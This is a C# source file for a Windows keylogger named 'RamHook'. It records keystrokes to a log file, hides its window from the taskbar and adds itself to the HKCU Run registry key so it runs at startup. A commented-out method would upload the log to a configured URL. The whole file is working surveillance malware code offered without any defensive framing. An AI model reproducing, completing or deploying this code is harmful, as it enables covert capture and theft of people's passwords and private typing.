﻿using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using Microsoft.Win32;
using System.Net;

/*
 * RamHook
 */

namespace KeyLogger
{
    /// <summary>
    /// Precesses all the keyboard input and performs assigned actions
    /// </summary>
    class Analyzer
    {
        /// <summary>
        /// current pressed keys cache
        /// stores keys and empties itself after flushing
        /// </summary>
        private string cache = "";

        private MainForm mainForm;

        /// <summary>
        /// Serves as a constructor
        /// </summary>
        /// <param name="mForm">Pointer to the main form</param>
        public void Init(MainForm mForm)
        {
            mainForm = mForm;
        }

        /// <summary>
        /// Gets string representation of provided key code
        /// </summary>
        /// <param name="vk">virtual key code</param>
        /// <returns>readable key code text</returns>
        public string GetKeyString(AnchorKeyboard.VKeys vk)
        {
            string name = Enum.GetName(typeof(AnchorKeyboard.VKeys), vk);
            if (!string.IsNullOrEmpty(name))
            {
                // represent a-z & 0-9 keys
                if (name.Contains("KEY_"))
                {
                    return name.Remove(0, 4);
                }
            }

            // display SPACE key as ' '
            if (vk == AnchorKeyboard.VKeys.SPACE)
            {
                return " ";
            }

            // enter should be represented as a new line
            if (vk == AnchorKeyboard.VKeys.RETURN)
            {
                return "\r\n";
            }

            return "[" + name + "]";
        }

        /// <summary>
        /// Processes the keyboard events
        /// </summary>
        public void ProcessHook(IntPtr wParam, IntPtr lParam)
        {
            int key = Marshal.ReadInt32(lParam);

            // add to cache
            cache += GetKeyString((AnchorKeyboard.VKeys)key);

            ProcessKeywords();

            // cache full? let's flush
            if (cache.Length >= WindowsFormsApplication1.Properties.Settings.Default.cacheSize)
            {
                ActionFlush();
            }
        }

        /// <summary>
        /// Performs ana action if the specified keyword is entered
        /// </summary>
        private void ProcessKeywords()
        {

        }

        /// <summary>
        /// Hide from Windows Taskbar
        /// </summary>
        public void ActionHide()
        {
            mainForm.ShowInTaskbar = false;
            mainForm.Visible = false;
            mainForm.Refresh();
        }

        /// <summary>
        /// Unhide from Windows Taskbar
        /// </summary>
        public void ActionUnhide()
        {
            mainForm.ShowInTaskbar = true;
            mainForm.Visible = true;
            mainForm.Refresh();
        }

        /// <summary>
        /// Flush the cache to log file
        /// </summary>
        public void ActionFlush()
        {
            //if (Properties.Settings.Default.uppercase == false)
            //{
            //    cache = cache.ToLower();
            //}

            try
            {
                File.AppendAllText("log.txt", cache);
                cache = "";
            }
            catch (Exception)
            {
            }
        }

        /// <summary>
        /// Session started. Write the header to the log file
        /// </summary>
        public void PrepareFile()
        {
            if (WindowsFormsApplication1.Properties.Settings.Default.appendLogFile == false)
            {
                ClearLogFile();
            }

            try
            {

                File.AppendAllText(WindowsFormsApplication1.Properties.Settings.Default.logFile, "\r\n\r\n\r\n==============================================");
                File.AppendAllText(WindowsFormsApplication1.Properties.Settings.Default.logFile, "\r\nRamHookLog - " + DateTime.Now.ToString());
                File.AppendAllText(WindowsFormsApplication1.Properties.Settings.Default.logFile, "\r\n==============================================\r\n");
            }
            catch (Exception)
            {
            }
        }

        /// <summary>
        /// Clear log file
        /// </summary>
        public void ClearLogFile()
        {
            try
            {
                File.WriteAllText(WindowsFormsApplication1.Properties.Settings.Default.logFile, "");
            }
            catch (Exception)
            {
            }
        }

        /// <summary>
        /// Add to Windows registry for autostart
        /// </summary>
        public void AddToWinStartup()
        {
            try
            {
                RegistryKey reg =
Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                reg.SetValue("RamHook", Application.ExecutablePath.ToString());
            }
            catch (Exception)
            {
                MessageBox.Show("Unable to Add to Windows Startup.Requires Administrator Access!");
            }
        }

        /// <summary>
        /// Remove from Windows registry
        /// </summary>
        public void DeleteFromWinStartup()
        {
            try
            {
                RegistryKey reg =
Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                reg.DeleteValue("RamHook", false);
            }
            catch (Exception)
            {
                MessageBox.Show("Unable to Delete from WindowsStartup. Requires Administrator Access!");
            }
        }

        /// <summary>
        /// Check if it's in Windows registry
        /// </summary>
        /// <returns>Application starts with windows</returns>
        public bool IsInStartup()
        {
            try
            {
                RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (reg.GetValue("RamHook").ToString() == Application.ExecutablePath.ToString())
                    return true;
                else
                    return false;
            }
            catch (Exception)
            {
                return false;
            }
        }


        /// <summary>
        /// Upload log file
        /// </summary>
        public void ActionUploadFile()
        {
            ActionFlush();

            //System.Net.WebClient Client = new System.Net.WebClient();
            //Client.Headers.Add("Content-Type", "binary/octet-stream");
            //byte[] result =Client.UploadFile(Properties.Settings.Default.uploadUrl, "POST",Properties.Settings.Default.logFile);
            //string s = System.Text.Encoding.UTF8.GetString(result,0, result.Length);

            return;
        }
    }
}
